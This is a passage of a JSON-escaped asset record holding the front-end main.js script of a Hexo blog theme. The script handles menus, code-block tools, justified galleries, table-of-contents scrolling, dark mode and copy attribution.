e.preventDefault()\n        btf.scrollToDest(btf.getEleTop(document.getElementById(decodeURI(target.getAttribute('href')).replace('#', ''))), 300)\n        if (window.innerWidth < 900) {\n          $cardTocLayout.classList.remove('open')\n        }\n      }\n\n      btf.addEventListenerPjax($cardToc, 'click', tocItemClickFn)\n\n      autoScrollToc = item => {\n        const sidebarHeight = $cardToc.clientHeight\n        const itemOffsetTop = item.offsetTop\n        const itemHeight = item.clientHeight\n        const scrollTop = $cardToc.scrollTop\n        const offset = itemOffsetTop - scrollTop\n        const middlePosition = (sidebarHeight - itemHeight) / 2\n\n        if (offset !== middlePosition) {\n          $cardToc.scrollTop = scrollTop + (offset - middlePosition)\n        }\n      }\n\n      // 處理 hexo-blog-encrypt 事件\n      $cardToc.style.display = 'block'\n    }\n\n    // find head position & add active class\n    const $articleList = $article.querySelectorAll('h1,h2,h3,h4,h5,h6')\n    let detectItem = ''\n\n    const findHeadPosition = top => {\n      if (top === 0) return false\n\n      let currentId = ''\n      let currentIndex = ''\n\n      for (let i = 0; i < $articleList.length; i++) {\n        const ele = $articleList[i]\n        if (top > btf.getEleTop(ele) - 80) {\n          const id = ele.id\n          currentId = id ? '#' + encodeURI(id) : ''\n          currentIndex = i\n        } else {\n          break\n        }\n      }\n\n      if (detectItem === currentIndex) return\n\n      if (isAnchor) btf.updateAnchor(currentId)\n\n      detectItem = currentIndex\n\n      if (isToc) {\n        $cardToc.querySelectorAll('.active').forEach(i => i.classList.remove('active'))\n\n        if (currentId) {\n          const currentActive = $tocLink[currentIndex]\n          currentActive.classList.add('active')\n\n          setTimeout(() => autoScrollToc(currentActive), 0)\n\n          if (!isExpand) {\n            let parent = currentActive.parentNode\n            while (!parent.matches('.toc')) {\n              if (parent.matches('li')) parent.classList.add('active')\n              parent = parent.parentNode\n            }\n          }\n        }\n      }\n    }\n\n    // main of scroll\n    const tocScrollFn = btf.throttle(() => {\n      const currentTop = window.scrollY || document.documentElement.scrollTop\n      if (isToc && GLOBAL_CONFIG.percent.toc) {\n        $tocPercentage.textContent = btf.getScrollPercent(currentTop, $article)\n      }\n      findHeadPosition(currentTop)\n    }, 100)\n\n    btf.addEventListenerPjax(window, 'scroll', tocScrollFn, { passive: true })\n  }\n\n  const handleThemeChange = mode => {\n    const globalFn = window.globalFn || {}\n    const themeChange = globalFn.themeChange || {}\n    if (!themeChange) {\n      return\n    }\n\n    Object.keys(themeChange).forEach(key => {\n      const themeChangeFn = themeChange[key]\n      if (['disqus', 'disqusjs'].includes(key)) {\n        setTimeout(() => themeChangeFn(mode), 300)\n      } else {\n        themeChangeFn(mode)\n      }\n    })\n  }\n\n  /**\n   * Rightside\n   */\n  const rightSideFn = {\n    readmode: () => { // read mode\n      const $body = document.body\n      const newEle = document.createElement('button')\n\n      const exitReadMode = () => {\n        $body.classList.remove('read-mode')\n        newEle.remove()\n        newEle.removeEventListener('click', exitReadMode)\n      }\n\n      $body.classList.add('read-mode')\n      newEle.type = 'button'\n      newEle.className = 'fas fa-sign-out-alt exit-readmode'\n      newEle.addEventListener('click', exitReadMode)\n      $body.appendChild(newEle)\n    },\n    darkmode: () => { // switch between light and dark mode\n      const willChangeMode = document.documentElement.getAttribute('data-theme') === 'dark' ? 'light' : 'dark'\n      if (willChangeMode === 'dark') {\n        btf.activateDarkMode()\n        GLOBAL_CONFIG.Snackbar !== undefined && btf.snackbarShow(GLOBAL_CONFIG.Snackbar.day_to_night)\n      } else {\n        btf.activateLightMode()\n        GLOBAL_CONFIG.Snackbar !== undefined && btf.snackbarShow(GLOBAL_CONFIG.Snackbar.night_to_day)\n      }\n      btf.saveToLocal.set('theme', willChangeMode, 2)\n      handleThemeChange(willChangeMode)\n    },\n    'rightside-config': item => { // Show or hide rightside-hide-btn\n      const hideLayout = item.firstElementChild\n      if (hideLayout.classList.contains('show')) {\n        hideLayout.classList.add('status')\n        setTimeout(() => {\n          hideLayout.classList.remove('status')\n        }, 300)\n      }\n\n      hideLayout.classList.toggle('show')\n    },\n    'go-up': () => { // Back to top\n      btf.scrollToDest(0, 500)\n    },\n    'hide-aside-btn': () => { // Hide aside\n      const $htmlDom = document.documentElement.classList\n      const saveStatus = $htmlDom.contains('hide-aside') ? 'show' : 'hide'\n      btf.saveToLocal.set('aside-status', saveStatus, 2)\n      $htmlDom.toggle('hide-aside')\n    },\n    'mobile-toc-button': (p, item) => { // Show mobile toc\n      const tocEle = document.getElementById('card-toc')\n      tocEle.style.transition = 'transform 0.3s ease-in-out'\n\n      const tocEleHeight = tocEle.clientHeight\n      const btData = item.getBoundingClientRect()\n\n      const tocEleBottom = window.innerHeight - btData.bottom - 30\n      if (tocEleHeight > tocEleBottom) {\n        tocEle.style.transformOrigin = `right ${tocEleHeight - tocEleBottom - btData.height / 2}px`\n      }\n\n      tocEle.classList.toggle('open')\n      tocEle.addEventListener('transitionend', () => {\n        tocEle.style.cssText = ''\n      }, { once: true })\n    },\n    'chat-btn': () => { // Show chat\n      window.chatBtnFn()\n    },\n    translateLink: () => { // switch between traditional and simplified chinese\n      window.translateFn.translatePage()\n    }\n  }\n\n  document.getElementById('rightside').addEventListener('click', e => {\n    const $target = e.target.closest('[id]')\n    if ($target && rightSideFn[$target.id]) {\n      rightSideFn[$target.id](e.currentTarget, $target)\n    }\n  })\n\n  /**\n   * menu\n   * 側邊欄sub-menu 展開/收縮\n   */\n  const clickFnOfSubMenu = () => {\n    const handleClickOfSubMenu = e => {\n      const target = e.target.closest('.site-page.group')\n      if (!target) return\n      target.classList.toggle('hide')\n    }\n\n    const menusItems = document.querySelector('#sidebar-menus .menus_items')\n    menusItems && menusItems.addEventListener('click', handleClickOfSubMenu)\n  }\n\n  /**\n   * 手机端目录点击\n   */\n  const openMobileMenu = () => {\n    const toggleMenu = document.getElementById('toggle-menu')\n    if (!toggleMenu) return\n    btf.addEventListenerPjax(toggleMenu, 'click', () => { sidebarFn.open() })\n  }\n\n  /**\n * 複製時加上版權信息\n */\n  const addCopyright = () => {\n    const { limitCount, languages } = GLOBAL_CONFIG.copyright\n\n    const handleCopy = (e) => {\n      e.preventDefault()\n      const copyFont = window.getSelection(0).toString()\n      let textFont = copyFont\n      if (copyFont.length > limitCount) {\n        textFont = `${copyFont}\\n\\n\\n${languages.author}\\n${languages.link}${window.location.href}\\n${languages.source}\\n${languages.info}`\n      }\n      if (e.clipboardData) {\n        return e.clipboardData.setData('text', textFont)\n      } else {\n        return window.clipboardData.setData('text', textFont)\n      }\n    }\n\n    document.body.addEventListener('copy', handleCopy)\n  }\n\n  /**\n   * 網頁運行時間\n   */\n  const addRuntime = () => {\n    const $runtimeCount = document.getElementById('runtimeshow')\n    if ($runtimeCount) {\n      const publishDate = $runtimeCount.getAttribute('data-publishDate')\n      $runtimeCount.textContent = `${btf.diffDate(publishDate)} ${GLOBAL_CONFIG.runtime}`\n    }\n  }\n\n  /**\n   * 最後一次更新時間\n   */\n  const addLastPushDate = () => {\n    const $lastPushDateItem = document.getElementById('last-push-date')\n    if ($lastPushDateItem) {\n      const lastPushDate = $lastPushDateItem.getAttribute('data-lastPushDate')\n      $lastPushDateItem.textContent = btf.diffDate(lastPushDate, true)\n    }\n  }\n\n  /**\n   * table overflow\n   */\n  const addTableWrap = () => {\n    const $table = document.querySelectorAll('#article-container table')\n    if (!$table.length) return\n\n    $table.forEach(item => {\n      if (!item.closest('.highlight')) {\n        btf.wrap(item, 'div', { class: 'table-wrap' })\n      }\n    })\n  }\n\n  /**\n   * tag-hide\n   */\n  const clickFnOfTagHide = () => {\n    const hideButtons = document.querySelectorAll('#article-container .hide-button')\n    if (!hideButtons.length) return\n    hideButtons.forEach(item => item.addEventListener('click', e => {\n      const currentTarget = e.currentTarget\n      currentTarget.classList.add('open')\n      addJustifiedGallery(currentTarget.nextElementSibling.querySelectorAll('.gallery-container'))\n    }, { once: true }))\n  }\n\n  const tabsFn = () => {\n    const navTabsElements = document.querySelectorAll('#article-container .tabs')\n    if (!navTabsElements.length) return\n\n    const setActiveClass = (elements, activeIndex) => {\n      elements.forEach((el, index) => {\n        el.classList.toggle('active', index === activeIndex)\n      })\n    }\n\n    const handleNavClick = e => {\n      const target = e.target.closest('button')\n      if (!target || target.classList.contains('active')) return\n\n      const navItems = [...e.currentTarget.children]\n      const tabContents = [...e.currentTarget.nextElementSibling.children]\n      const indexOfButton = navItems.indexOf(target)\n      setActiveClass(navItems, indexOfButton)\n      e.currentTarget.classList.remove('no-default')\n      setActiveClass(tabContents, indexOfButton)\n      addJustifiedGallery(tabContents[indexOfButton].querySelectorAll('.gallery-container'), true)\n    }\n\n    const handleToTopClick = tabElement => e => {\n      if (e.target.closest('button')) {\n        btf.scrollToDest(btf.getEleTop(tabElement), 300)\n      }\n    }\n\n    navTabsElements.forEach(tabElement => {\n      btf.addEventListenerPjax(tabElement.firstElementChild, 'click', handleNavClick)\n      btf.addEventListenerPjax(tabElement.lastElementChild, 'click', handleToTopClick(tabElement))\n    })\n  }\n\n  const toggleCardCategory = () => {\n    const cardCategory = document.querySelector('#aside-cat-list.expandBtn')\n    if (!cardCategory) return\n\n    const handleToggleBtn = e => {\n      const target = e.target\n      if (target.nodeName === 'I') {\n        e.preventDefault()\n        target.parentNode.classList.toggle('expand')\n      }\n    }\n    btf.addEventListenerPjax(cardCategory, 'click', handleToggleBtn, true)\n  }\n\n  const addPostOutdateNotice = () => {\n    const ele = document.getElementById('post-outdate-notice')\n    if (!ele) return\n\n    const { limitDay, messagePrev, messageNext, postUpdate } = JSON.parse(ele.getAttribute('data'))\n    const diffDay = btf.diffDate(postUpdate)\n    if (diffDay >= limitDay) {\n      ele.textContent = `${messagePrev} ${diffDay} ${messageNext}`\n      ele.hidden = false\n    }\n  }\n\n  const lazyloadImg = () => {\n    window.lazyLoadInstance = new LazyLoad({\n      elements_selector: 'img',\n      threshold: 0,\n      data_src: 'lazy-src'\n    })\n\n    btf.addGlobalFn('pjaxComplete', () => {\n      window.lazyLoadInstance.update()\n    }, 'lazyload')\n  }\n\n  const relativeDate = selector => {\n    selector.forEach(item => {\n      item.textContent = btf.diffDate(item.getAttribute('datetime'), true)\n      item.style.display = 'inline'\n    })\n  }\n\n  const justifiedIndexPostUI = () => {\n    const recentPostsElement = document.getElementById('recent-posts')\n    if (!(recentPostsElement && recentPostsElement.classList.contains('masonry'))) return\n\n    const init = () => {\n      const masonryItem = new InfiniteGrid.MasonryInfiniteGrid('.recent-post-items', {\n        gap: { horizontal: 10, vertical: 20 },\n        useTransform: true,\n        useResizeObserver: true\n      })\n      masonryItem.renderItems()\n      btf.addGlobalFn('pjaxCompleteOnce', () => { masonryItem.destroy() }, 'removeJustifiedIndexPostUI')\n    }\n\n    typeof InfiniteGrid === 'function' ? init() : btf.getScript(`${GLOBAL_CONFIG.infinitegrid.js}`).then(init)\n  }\n\n  const unRefreshFn = () => {\n    window.addEventListener('resize', () => {\n      adjustMenu(false)\n      mobileSidebarOpen && btf.isHidden(document.getElementById('toggle-menu')) && sidebarFn.close()\n    })\n\n    const menuMask = document.getElementById('menu-mask')\n    menuMask && menuMask.addEventListener('click', () => { sidebarFn.close() })\n\n    clickFnOfSubMenu()\n    GLOBAL_CONFIG.islazyloadPlugin && lazyloadImg()\n    GLOBAL_CONFIG.copyright !== undefined && addCopyright()\n\n    if (GLOBAL_CONFIG.autoDarkmode) {\n      window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', e => {\n        if (btf.saveToLocal.get('theme') !== undefined) return\n        e.matches ? handleThemeChange('dark') : handleThemeChange('light')\n      })\n    }\n  }\n\n  const forPostFn = () => {\n    addHighlightTool()\n    addPhotoFigcaption()\n    addJustifiedGallery(document.querySelectorAll('#article-container .gallery-container'))\n    runLightbox()\n    scrollFnToDo()\n    addTableWrap()\n    clickFnOfTagHide()\n    tabsFn()\n  }\n\n  const refreshFn = () => {\n    initAdjust()\n    justifiedIndexPostUI()\n\n    if (GLOBAL_CONFIG_SITE.pageType === 'post') {\n      addPostOutdateNotice()\n      GLOBAL_CONFIG.relativeDate.post && relativeDate(document.querySelectorAll('#post-meta time'))\n    } else {\n      GLOBAL_CONFIG.relativeDate.homepage && relativeDate(document.querySelectorAll('#recent-posts time'))\n      GLOBAL_CONFIG.runtime && addRuntime()\n      addLastPushDate()\n      toggleCardCategory()\n    }\n\n    GLOBAL_CONFIG_SITE.pageType === 'home' && scrollDownInIndex()\n    scrollFn()\n\n    forPostFn()\n    GLOBAL_CONFIG_SITE.pageType !== 'shuoshuo' && btf.switchComments(document)\n    openMobileMenu()\n  }\n\n  btf.addGlobalFn('pjaxComplete', refreshFn, 'refreshFn')\n  refreshFn()\n  unRefreshFn()\n\n  // 處理 hexo-blog-encrypt 事件\n  window.addEventListener('hexo-blog-decrypt', e => {\n    forPostFn()\n    window.translateFn.translateInitialization()\n    Object.values(window.globalFn.encrypt).forEach(fn => {\n      fn()\n    })\n  })\n})\n","source":"js/main.js","raw":"document.addEventListener('DOMContentLoaded', () => {\n  let headerContentWidth, $nav\n  let mobileSidebarOpen = false\n\n  const adjustMenu = init => {\n    const getAllWidth = ele => Array.from(ele).reduce((width, i) => width + i.offsetWidth, 0)\n\n    if (init) {\n      const blogInfoWidth = getAllWidth(document.querySelector('#blog-info > a').children)\n      const menusWidth = getAllWidth(document.getElementById('menus').children)\n      headerContentWidth = blogInfoWidth + menusWidth\n      $nav = document.getElementById('nav')\n    }\n\n    const hideMenuIndex = window.innerWidth <= 768 || headerContentWidth > $nav.offsetWidth - 120\n    $nav.classList.toggle('hide-menu', hideMenuIndex)\n  }\n\n  // 初始化header\n  const initAdjust = () => {\n    adjustMenu(true)\n    $nav.classList.add('show')\n  }\n\n  // sidebar menus\n  const sidebarFn = {\n    open: () => {\n      btf.overflowPaddingR.add()\n      btf.animateIn(document.getElementById('menu-mask'), 'to_show 0.5s')\n      document.getElementById('sidebar-menus').classList.add('open')\n      mobileSidebarOpen = true\n    },\n    close: () => {\n      btf.overflowPaddingR.remove()\n      btf.animateOut(document.getElementById('menu-mask'), 'to_hide 0.5s')\n      document.getElementById('sidebar-menus').classList.remove('open')\n      mobileSidebarOpen = false\n    }\n  }\n\n  /**\n   * 首頁top_img底下的箭頭\n   */\n  const scrollDownInIndex = () => {\n    const handleScrollToDest = () => {\n      btf.scrollToDest(document.getElementById('content-inner').offsetTop, 300)\n    }\n\n    const $scrollDownEle = document.getElementById('scroll-down')\n    $scrollDownEle && btf.addEventListenerPjax($scrollDownEle, 'click', handleScrollToDest)\n  }\n\n  /**\n   * 代碼\n   * 只適用於Hexo默認的代碼渲染\n   */\n  const addHighlightTool = () => {\n    const highLight = GLOBAL_CONFIG.highlight\n    if (!highLight) return\n\n    const { highlightCopy, highlightLang, highlightHeightLimit, highlightFullpage, highlightMacStyle, plugin } = highLight\n    const isHighlightShrink = GLOBAL_CONFIG_SITE.isHighlightShrink\n    const isShowTool = highlightCopy || highlightLang || isHighlightShrink !== undefined || highlightFullpage || highlightMacStyle\n    const $figureHighlight = plugin === 'highlight.js' ? document.querySelectorAll('figure.highlight') : document.querySelectorAll('pre[class*=\"language-\"]')\n\n    if (!((isShowTool || highlightHeightLimit) && $figureHighlight.length)) return\n\n    const isPrismjs = plugin === 'prismjs'\n    const highlightShrinkClass = isHighlightShrink === true ? 'closed' : ''\n    const highlightShrinkEle = isHighlightShrink !== undefined ? '<i class=\"fas fa-angle-down expand\"></i>' : ''\n    const highlightCopyEle = highlightCopy ? '<div class=\"copy-notice\"></div><i class=\"fas fa-paste copy-button\"></i>' : ''\n    const highlightMacStyleEle = '<div class=\"macStyle\"><div class=\"mac-close\"></div><div class=\"mac-minimize\"></div><div class=\"mac-maximize\"></div></div>'\n    const highlightFullpageEle = highlightFullpage ? '<i class=\"fa-solid fa-up-right-and-down-left-from-center fullpage-button\"></i>' : ''\n\n    const alertInfo = (ele, text) => {\n      if (GLOBAL_CONFIG.Snackbar !== undefined) {\n        btf.snackbarShow(text)\n      } else {\n        ele.textContent = text\n        ele.style.opacity = 1\n        setTimeout(() => { ele.style.opacity = 0 }, 800)\n      }\n    }\n\n    const copy = async (text, ctx) => {\n      try {\n        await navigator.clipboard.writeText(text)\n        alertInfo(ctx, GLOBAL_CONFIG.copy.success)\n      } catch (err) {\n        console.error('Failed to copy: ', err)\n        alertInfo(ctx, GLOBAL_CONFIG.copy.noSupport)\n      }\n    }\n\n    // click events\n    const highlightCopyFn = (ele, clickEle) => {\n      const $buttonParent = ele.parentNode\n      $buttonParent.classList.add('copy-true')\n      const preCodeSelector = isPrismjs ? 'pre code' : 'table .code pre'\n      const codeElement = $buttonParent.querySelector(preCodeSelector)\n      if (!codeElement) return\n      copy(codeElement.innerText, clickEle.previousElementSibling)\n      $buttonParent.classList.remove('copy-true')\n    }\n\n    const highlightShrinkFn = ele => ele.classList.toggle('closed')\n\n    const codeFullpage = (item, clickEle) => {\n      const wrapEle = item.closest('figure.highlight')\n      const isFullpage = wrapEle.classList.toggle('code-fullpage')\n\n      document.body.style.overflow = isFullpage ? 'hidden' : ''\n      clickEle.classList.toggle('fa-down-left-and-up-right-to-center', isFullpage)\n      clickEle.classList.toggle('fa-up-right-and-down-left-from-center', !isFullpage)\n    }\n\n    const highlightToolsFn = e => {\n      const $target = e.target.classList\n      const currentElement = e.currentTarget\n      if ($target.contains('expand')) highlightShrinkFn(currentElement)\n      else if ($target.contains('copy-button')) highlightCopyFn(currentElement, e.target)\n      else if ($target.contains('fullpage-button')) codeFullpage(currentElement, e.target)\n    }\n\n    const expandCode = e => e.currentTarget.classList.toggle('expand-done')\n\n    // 獲取隱藏狀態下元素的真實高度\n    const getActualHeight = item => {\n      const hiddenElements = new Map()\n\n      const fix = () => {\n        let current = item\n        while (current !== document.body && current != null) {\n          if (window.getComputedStyle(current).display === 'none') {\n            hiddenElements.set(current, current.getAttribute('style') || '')\n          }\n          current = current.parentNode\n        }\n\n        const style = 'visibility: hidden !important; display: block !important;'\n        hiddenElements.forEach((originalStyle, elem) => {\n          elem.setAttribute('style', originalStyle ? originalStyle + ';' + style : style)\n        })\n      }\n\n      const restore = () => {\n        hiddenElements.forEach((originalStyle, elem) => {\n          if (originalStyle === '') elem.removeAttribute('style')\n          else elem.setAttribute('style', originalStyle)\n        })\n      }\n\n      fix()\n      const height = item.offsetHeight\n      restore()\n      return height\n    }\n\n    const createEle = (lang, item) => {\n      const fragment = document.createDocumentFragment()\n\n      if (isShowTool) {\n        const hlTools = document.createElement('div')\n        hlTools.className = `highlight-tools ${highlightShrinkClass}`\n        hlTools.innerHTML = highlightMacStyleEle + highlightShrinkEle + lang + highlightCopyEle + highlightFullpageEle\n        btf.addEventListenerPjax(hlTools, 'click', highlightToolsFn)\n        fragment.appendChild(hlTools)\n      }\n\n      if (highlightHeightLimit && getActualHeight(item) > highlightHeightLimit + 30) {\n        const ele = document.createElement('div')\n        ele.className = 'code-expand-btn'\n        ele.innerHTML = '<i class=\"fas fa-angle-double-down\"></i>'\n        btf.addEventListenerPjax(ele, 'click', expandCode)\n        fragment.appendChild(ele)\n      }\n\n      isPrismjs ? item.parentNode.insertBefore(fragment, item) : item.insertBefore(fragment, item.firstChild)\n    }\n\n    $figureHighlight.forEach(item => {\n      let langName = ''\n      if (isPrismjs) btf.wrap(item, 'figure', { class: 'highlight' })\n\n      if (!highlightLang) {\n        createEle('', item)\n        return\n      }\n\n      if (isPrismjs) {\n        langName = item.getAttribute('data-language') || 'Code'\n      } else {\n        langName = item.getAttribute('class').split(' ')[1]\n        if (langName === 'plain' || langName === undefined) langName = 'Code'\n      }\n      createEle(`<div class=\"code-lang\">${langName}</div>`, item)\n    })\n  }\n\n  /**\n   * PhotoFigcaption\n   */\n  const addPhotoFigcaption = () => {\n    if (!GLOBAL_CONFIG.isPhotoFigcaption) return\n    document.querySelectorAll('#article-container img').forEach(item => {\n      const altValue = item.title || item.alt\n      if (!altValue) return\n      const ele = document.createElement('div')\n      ele.className = 'img-alt text-center'\n      ele.textContent = altValue\n      item.insertAdjacentElement('afterend', ele)\n    })\n  }\n\n  /**\n   * Lightbox\n   */\n  const runLightbox = () => {\n    btf.loadLightbox(document.querySelectorAll('#article-container img:not(.no-lightbox)'))\n  }\n\n  /**\n   * justified-gallery 圖庫排版\n   */\n\n  const fetchUrl = async url => {\n    try {\n      const response = await fetch(url)\n      return await response.json()\n    } catch (error) {\n      console.error('Failed to fetch URL:', error)\n      return []\n    }\n  }\n\n  const runJustifiedGallery = (container, data, config) => {\n    const { isButton, limit, firstLimit, tabs } = config\n\n    const dataLength = data.length\n    const maxGroupKey = Math.ceil((dataLength - firstLimit) / limit + 1)\n\n    // Gallery configuration\n    const igConfig = {\n      gap: 5,\n      isConstantSize: true,\n      sizeRange: [150, 600],\n      // useResizeObserver: true,\n      // observeChildren: true,\n      useTransform: true\n      // useRecycle: false\n    }\n\n    const ig = new InfiniteGrid.JustifiedInfiniteGrid(container, igConfig)\n    let isLayoutHidden = false\n\n    // Utility functions\n    const sanitizeString = str => (str && str.replace(/\"/g, '&quot;')) || ''\n\n    const createImageItem = item => {\n      const alt = item.alt ? `alt=\"${sanitizeString(item.alt)}\"` : ''\n      const title = item.title ? `title=\"${sanitizeString(item.title)}\"` : ''\n      return `<div class=\"item\">\n        <img src=\"${item.url}\" data-grid-maintained-target=\"true\" ${alt} ${title} />\n      </div>`\n    }\n\n    const getItems = (nextGroupKey, count, isFirst = false) => {\n      const startIndex = isFirst ? (nextGroupKey - 1) * count : (nextGroupKey - 2) * count + firstLimit\n      return data.slice(startIndex, startIndex + count).map(createImageItem)\n    }\n\n    // Load more button\n    const addLoadMoreButton = container => {\n      const button = document.createElement('button')\n      button.innerHTML = `${GLOBAL_CONFIG.infinitegrid.buttonText}<i class=\"fa-solid fa-arrow-down\"></i>`\n\n      button.addEventListener('click', () => {\n        button.remove()\n        btf.setLoading.add(container)\n        appendItems(ig.getGroups().length + 1, limit)\n      }, { once: true })\n\n      container.insertAdjacentElement('afterend', button)\n    }\n\n    const appendItems = (nextGroupKey, count, isFirst) => {\n      ig.append(getItems(nextGroupKey, count, isFirst), nextGroupKey)\n    }\n\n    // Event handlers\n    const handleRenderComplete = e => {\n      if (tabs) {\n        const parentNode = container.parentNode\n        if (isLayoutHidden) {\n          parentNode.style.visibility = 'visible'\n        }\n        if (container.offsetHeight === 0) {\n          parentNode.style.visibility = 'hidden'\n          isLayoutHidden = true\n        }\n      }\n\n      const { updated, isResize, mounted } = e\n      if (!updated.length || !mounted.length || isResize) return\n\n      btf.loadLightbox(container.querySelectorAll('img:not(.medium-zoom-image)'))\n\n      if (ig.getGroups().length === maxGroupKey) {\n        btf.setLoading.remove(container)\n        !tabs && ig.off('renderComplete', handleRenderComplete)\n        return\n      }\n\n      if (isButton) {\n        btf.setLoading.remove(container)\n        addLoadMoreButton(container)\n      }\n    }\n\n    const handleRequestAppend = btf.debounce(e => {\n      const nextGroupKey = (+e.groupKey || 0) + 1\n\n      if (nextGroupKey === 1) appendItems(nextGroupKey, firstLimit, true)\n      else appendItems(nextGroupKey, limit)\n\n      if (nextGroupKey === maxGroupKey) ig.off('requestAppend', handleRequestAppend)\n    }, 300)\n\n    btf.setLoading.add(container)\n    ig.on('renderComplete', handleRenderComplete)\n\n    if (isButton) {\n      appendItems(1, firstLimit, true)\n    } else {\n      ig.on('requestAppend', handleRequestAppend)\n      ig.renderItems()\n    }\n\n    btf.addGlobalFn('pjaxSendOnce', () => ig.destroy())\n  }\n\n  const addJustifiedGallery = async (elements, tabs = false) => {\n    if (!elements.length) return\n\n    const initGallery = async () => {\n      for (const element of elements) {\n        if (btf.isHidden(element) || element.classList.contains('loaded')) continue\n\n        const config = {\n          isButton: element.getAttribute('data-button') === 'true',\n          limit: parseInt(element.getAttribute('data-limit'), 10),\n          firstLimit: parseInt(element.getAttribute('data-first'), 10),\n          tabs\n        }\n\n        const container = element.firstElementChild\n        const content = container.textContent\n        container.textContent = ''\n        element.classList.add('loaded')\n\n        try {\n          const data = element.getAttribute('data-type') === 'url' ? await fetchUrl(content) : JSON.parse(content)\n          runJustifiedGallery(container, data, config)\n        } catch (error) {\n          console.error('Gallery data parsing failed:', error)\n        }\n      }\n    }\n\n    if (typeof InfiniteGrid === 'function') {\n      await initGallery()\n    } else {\n      await btf.getScript(GLOBAL_CONFIG.infinitegrid.js)\n      await initGallery()\n    }\n  }\n\n  /**\n   * rightside scroll percent\n   */\n  const rightsideScrollPercent = currentTop => {\n    const scrollPercent = btf.getScrollPercent(currentTop, document.body)\n    const goUpElement = document.getElementById('go-up')\n\n    if (scrollPercent < 95) {\n      goUpElement.classList.add('show-percent')\n      goUpElement.querySelector('.scroll-percent').textContent = scrollPercent\n    } else {\n      goUpElement.classList.remove('show-percent')\n    }\n  }\n\n  /**\n   * 滾動處理\n   */\n  const scrollFn = () => {\n    const $rightside = document.getElementById('rightside')\n    const innerHeight = window.innerHeight + 56\n    let initTop = 0\n    const $header = document.getElementById('page-header')\n    const isChatBtn = typeof chatBtn !== 'undefined'\n    const isShowPercent = GLOBAL_CONFIG.percent.rightside\n\n    // 檢查文檔高度是否小於視窗高度\n    const checkDocumentHeight = () => {\n      if (document.body.scrollHeight <= innerHeight) {\n        $rightside.classList.add('rightside-show')\n        return true\n      }\n      return false\n    }\n\n    // 如果文檔高度小於視窗高度,直接返回\n    if (checkDocumentHeight()) return\n\n    // find the scroll direction\n    const scrollDirection = currentTop => {\n      const result = currentTop > initTop // true is down & false is up\n      initTop = currentTop\n      return result\n    }\n\n    let flag = ''\n    const scrollTask = btf.throttle(() => {\n      const currentTop = window.scrollY || document.documentElement.scrollTop\n      const isDown = scrollDirection(currentTop)\n      if (currentTop > 56) {\n        if (flag === '') {\n          $header.classList.add('nav-fixed')\n          $rightside.classList.add('rightside-show')\n        }\n\n        if (isDown) {\n          if (flag !== 'down') {\n            $header.classList.remove('nav-visible')\n            isChatBtn && window.chatBtn.hide()\n            flag = 'down'\n          }\n        } else {\n          if (flag !== 'up') {\n            $header.classList.add('nav-visible')\n            isChatBtn && window.chatBtn.show()\n            flag = 'up'\n          }\n        }\n      } else {\n        flag = ''\n        if (currentTop === 0) {\n          $header.classList.remove('nav-fixed', 'nav-visible')\n        }\n        $rightside.classList.remove('rightside-show')\n      }\n\n      isShowPercent && rightsideScrollPercent(currentTop)\n      checkDocumentHeight()\n    }, 300)\n\n    btf.addEventListenerPjax(window, 'scroll', scrollTask, { passive: true })\n  }\n\n  /**\n  * toc,anchor\n  */\n  const scrollFnToDo = () => {\n    const isToc = GLOBAL_CONFIG_SITE.isToc\n    const isAnchor = GLOBAL_CONFIG.isAnchor\n    const $article = document.getElementById('article-container')\n\n    if (!($article && (isToc || isAnchor))) return\n\n    let $tocLink, $cardToc, autoScrollToc, $tocPercentage, isExpand\n\n    if (isToc) {\n      const $cardTocLayout = document.getElementById('card-toc')\n      $cardToc = $cardTocLayout.querySelector('.toc-content')\n      $tocLink = $cardToc.querySelectorAll('.toc-link')\n      $tocPercentage = $cardTocLayout.querySelector('.toc-percentage')\n      isExpand = $cardToc.classList.contains('is-expand')\n\n      // toc元素點擊\n      const tocItemClickFn = e => {\n        const target = e.target.closest('.toc-link')\n        if (!target) return\n\n        e.preventDefault()\n        btf.scrollToDest(btf.getEleTop(document.getElementById(decodeURI(target.getAttribute('href')).replace('#', ''))), 300)\n        if (window.innerWidth < 900) {\n          $cardTocLayout.classList.remove('open')\n        }\n      }\n\n      btf.addEventListenerPjax($cardToc, 'click', tocItemClickFn)\n\n      autoScrollToc = item => {\n        const sidebarHeight = $cardToc.clientHeight\n        const itemOffsetTop = item.offsetTop\n        const itemHeight = item.clientHeight\n        const scrollTop = $cardToc.scrollTop\n        const offset = itemOffsetTop - scrollTop\n        const middlePosition = (sidebarHeight - itemHeight) / 2\n\n        if (offset !== middlePosition) {\n          $cardToc.scrollTop = scrollTop + (offset - middlePosition)\n        }\n      }\n\n      // 處理 hexo-blog-encrypt 事件\n      $cardToc.style.display = 'block'\n    }\n\n    // find head position & add active class\n    const $articleList = $article.querySelectorAll('h1,h2,h3,h4,h5,h6')\n    let detectItem = ''\n\n    const findHeadPosition = top => {\n      if (top === 0) return false\n\n      let currentId = ''\n      let currentIndex = ''\n\n      for (let i = 0; i < $articleList.length; i++) {\n        const ele = $articleList[i]\n        if (top > btf.getEleTop(ele) - 80) {\n          const id = ele.id\n          currentId = id ? '#' + encodeURI(id) : ''\n          currentIndex = i\n        } else {\n          break\n        }\n      }\n\n      if (detectItem === currentIndex) return\n\n      if (isAnchor) btf.updateAnchor(currentId)\n\n      detectItem = currentIndex\n\n      if (isToc) {\n        $cardToc.querySelectorAll('.active').forEach(i => i.classList.remove('active'))\n\n        if (currentId) {\n          const currentActive = $tocLink[currentIndex]\n          currentActive.classList.add('active')\n\n          setTimeout(() => autoScrollToc(currentActive), 0)\n\n          if (!isExpand) {\n            let parent = currentActive.parentNode\n            while (!parent.matches('.toc')) {\n              if (parent.matches('li')) parent.classList.add('active')\n              parent = parent.parentNode\n            }\n          }\n        }\n      }\n    }\n\n    // main of scroll\n    const tocScrollFn = btf.throttle(() => {\n      const currentTop = window.scrollY || document.documentElement.scrollTop\n      if (isToc && GLOBAL_CONFIG.percent.toc) {\n        $tocPercentage.textContent = btf.getScrollPercent(currentTop, $article)\n      }\n      findHeadPosition(currentTop)\n    }, 100)\n\n    btf.addEventListenerPjax(window, 'scroll', tocScrollFn, { passive: true })\n  }\n\n  const handleThemeChange = mode => {\n    const globalFn = window.globalFn || {}\n    const themeChange = globalFn.themeChange || {}\n    if (!themeChange) {\n      return\n    }\n\n    Object.keys(themeChange).forEach(key => {\n      const themeChangeFn = themeChange[key]\n      if (['disqus', 'disqusjs'].includes(key)) {\n        setTimeout(() => 